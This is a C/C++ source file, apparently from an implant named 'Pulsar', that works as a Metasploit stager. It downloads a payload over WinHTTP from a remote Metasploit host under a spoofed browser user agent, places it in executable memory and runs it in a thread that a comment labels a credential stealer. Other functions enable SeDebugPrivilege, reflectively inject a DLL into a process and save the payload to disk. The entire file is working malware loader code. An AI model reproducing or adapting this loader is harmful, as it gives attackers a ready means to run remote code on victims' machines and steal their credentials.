#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winhttp.h>
#include <sys/types.h>
#include "Pulsar.h"
#include "MetasploitLoader.h"
#include "PulsarLog.h"
#include "LoadLibraryR.h"
#include "Constants.h"
#include "ProxyCreds.h"

#pragma comment(lib, "winhttp.lib")

extern PPULSAR_CONTEXT pulsar_context;


VOID LaunchShellCode(LPVOID exeBuffer){


	ExecuteShellcode(exeBuffer);
}

int LoadHTTPPayload(const char *metasploit_host, int metasploit_port) {
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	LPSTR exeBuffer;
	off_t offset = 0;
	BOOL bResults = FALSE;
	size_t content_length = 0;
	HINTERNET	hSession = NULL,
				hConnect = NULL,
				hRequest = NULL;

	const WCHAR *pwcsMetasploitHost;
	int nChars = MultiByteToWideChar(CP_UTF8, 0, metasploit_host, -1, NULL, 0);
	pwcsMetasploitHost = new WCHAR[nChars];
	MultiByteToWideChar(CP_UTF8, 0, metasploit_host, -1, (LPWSTR)pwcsMetasploitHost, nChars);

	hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
						   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
						   WINHTTP_NO_PROXY_NAME,
						   WINHTTP_NO_PROXY_BYPASS, 0);

	// TODO: Check for "Connection Refused" and similar. If we can't connect, just go back to sleep until
	// the next timer.
	if (hSession)
		hConnect = WinHttpConnect(hSession, pwcsMetasploitHost, metasploit_port, 0);

	//Set the redirection flags
	SetHandleRedirFlags(hSession);
	
	//Set the security flags
	SetHandleProtFlags(hSession);

	// TODO: Replace that "OiJZ" string with something generated based on the payload we actually need
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/OiJZ", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);


	if (hRequest){
		//Set the redirection flags
		SetHandleRedirFlags(hRequest);

		//Set the security flags
		SetHandleCERTFlags(hRequest);
		
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

	}


	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	if (bResults) {
		// Get the Content-Length header so we can allocate appropriately.
		WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
		if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			LPVOID lpOutBuffer = new WCHAR[dwSize/sizeof(WCHAR)];
			WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);
			content_length = _wtoi((const wchar_t *)lpOutBuffer);
			DBGPrint("Content-Length: %d\n", content_length);
			delete [] lpOutBuffer;
		}

		//exeBuffer = new char[content_length];
		exeBuffer = (LPSTR)VirtualAlloc(0, content_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				DBGPrint("WinHttpQueryDataAvailable: %d\n", GetLastError());

			DBGPrint("File size: %d\n", dwSize);

			pszOutBuffer = new char[dwSize+1];
			if (!pszOutBuffer) {
				DBGPrint("Out of memory\n");
				dwSize = 0;
			} else {
				// Read the data
				ZeroMemory(pszOutBuffer, dwSize+1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
					DBGPrint("Error %d in WinHttpReadData\n", GetLastError());

				RtlCopyMemory(&exeBuffer[offset], pszOutBuffer, dwSize);
				offset += dwSize;

				delete []pszOutBuffer;
			}
		} while (dwSize > 0);

		DBGPrint("offset: %d\n", offset);

		// TODO: Sanity-check that our payload is approximately the right size (~770K)
		// If it's somewhere around 145 bytes then metasploit is listening on the port but
		// not expecting a connection.
		
		if (exeBuffer) {
			DBGPrint("Executing shellcode\n");

			//Create the User detector/cred stealer Thread
			HANDLE tmpHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LaunchShellCode, exeBuffer, 0, NULL);
			if (tmpHandle) {
				DBGPrint("Launched shellcode thread\n");
			}
			else {
				DBGPrint("Failed to start user watcher thread\n");
			}

			//SavePayload("C:\\Users\\user\\Desktop\\payload.dll", exeBuffer, content_length);
			//InjectPayload(exeBuffer, content_length, -1);
			//ExecuteShellcode(exeBuffer);
			DBGPrint("Finished executing shellcode\n");
		}
	}

	if (!bResults)
		DBGPrint("Error %d has occurred.\n", GetLastError());
	
	if (pwcsMetasploitHost)
		delete [] pwcsMetasploitHost;

	if (hRequest)
		WinHttpCloseHandle(hRequest);
	if (hConnect)
		WinHttpCloseHandle(hConnect);
	if (hSession)
		WinHttpCloseHandle(hSession);

	return 0;
}



void ExecuteShellcode(LPVOID exeBuffer) {
	void(*function)();
	TOKEN_PRIVILEGES priv = { 0 };
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);
	}

	function = (void(*)()) exeBuffer;
	function();
}


BOOL SavePayload(const char *FileName, LPSTR exeBuffer, DWORD exeLength) {
	DWORD dwBytesWritten = 0;
	BOOL bRetVal = FALSE;

	HANDLE hFile =  CreateFile(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE) {
		DBGPrint("ERROR (CreateFile) 0x%x\n", GetLastError());
		goto exit;
	}

	//Write the bytes out
	if (!WriteFile(hFile, exeBuffer, exeLength, &dwBytesWritten, NULL)) {
		printf(" ERROR (WriteFile) 0x%x\n", GetLastError());
		goto exit;
	}
	bRetVal = TRUE;

exit:
	if (hFile) {
		CloseHandle(hFile);
	}

	return bRetVal;
}

int InjectPayload(LPVOID exeBuffer, DWORD exeLength, DWORD processId) {
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = {0};
	DWORD dwProcessId = 0;

	if (processId == -1)
		dwProcessId = GetCurrentProcessId();
	else
		dwProcessId = processId;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess) {
		DBGPrint("Failed to open the target process: %d\n", GetLastError());
		return 1;
	}

	if (!LoadLibraryR(exeBuffer, exeLength))
		DBGPrint("Failed to inject the DLL\n");

	if (hProcess)
		CloseHandle(hProcess);

	return 0;
}
